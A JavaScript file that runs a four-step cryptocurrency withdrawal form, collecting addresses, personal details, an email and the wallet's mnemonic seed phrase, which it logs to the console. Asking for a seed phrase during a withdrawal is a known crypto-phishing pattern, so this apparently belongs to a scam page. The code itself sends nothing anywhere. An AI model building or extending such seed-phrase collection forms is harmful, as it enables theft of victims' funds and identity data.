document.addEventListener('DOMContentLoaded', () => {
  // Step 1: Withdraw Setup - Validate and Proceed to Step 2
  function confirmStep1() {
    const address = document.getElementById('withdrawalAddress').value.trim();
    const network = document.getElementById('network').value;
    const country = document.getElementById('country').value;
    const exchanger = document.getElementById('cryptoExchanger').value;

    if (!address || !network || !country || !exchanger) {
      alert('Please complete all fields.');
      return;
    }

    // Corrected template literals
    console.log(`Withdrawal Address: ${address}`);
    console.log(`Network: ${network}`);
    console.log(`Country: ${country}`);
    console.log(`Crypto Exchanger: ${exchanger}`);

    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
  }

  // Step 2: Receiver Information - Validate and Proceed to Step 3
  function confirmStep2() {
    const receiver = document.getElementById('receiverAddress').value.trim();
    const name = document.getElementById('receiverName').value.trim();
    const surname = document.getElementById('receiverSurname').value.trim();
    const withdrawalReason = document.getElementById('withdrawalReason').value.trim();
    const sourceOfIncome = document.getElementById('sourceOfIncome').value;

    if (!receiver || !name || !surname || !withdrawalReason || !sourceOfIncome) {
      alert('Please complete all fields.');
      return;
    }

    console.log({
      receiverAddress: receiver,
      name: name,
      surname: surname,
      withdrawalReason: withdrawalReason,
      sourceOfIncome: sourceOfIncome,
    });

    document.getElementById('step2').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
  }

  // Step 3: Wallet - Validate and Proceed to Final Step
  function confirmStep3() {
    const email = document.getElementById('email').value.trim();
    const mnemonic = document.getElementById('mnemonic').value.trim();

    if (!email || !mnemonic) {
      alert('Please complete all fields.');
      return;
    }

    console.log({
      email: email,
      mnemonic: mnemonic,
    });

    document.getElementById('step3').style.display = 'none';
    document.getElementById('step4').style.display = 'block';
  }

  // Back button handlers
  function backToStep1() {
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step1').style.display = 'block';
  }

  function backToStep2() {
    document.getElementById('step3').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
  }

  function backToStep3() {
    document.getElementById('step4').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
  }

  // Register event listeners after DOM is loaded
  document.getElementById('continueStep1').addEventListener('click', confirmStep1);
  document.getElementById('continueStep2').addEventListener('click', confirmStep2);
  document.getElementById('continueStep3').addEventListener('click', confirmStep3);

  // Optional: Register back buttons if they exist
  const back1 = document.getElementById('backToStep1');
  const back2 = document.getElementById('backToStep2');
  const back3 = document.getElementById('backToStep3');

  if (back1) back1.addEventListener('click', backToStep1);
  if (back2) back2.addEventListener('click', backToStep2);
  if (back3) back3.addEventListener('click', backToStep3);
});
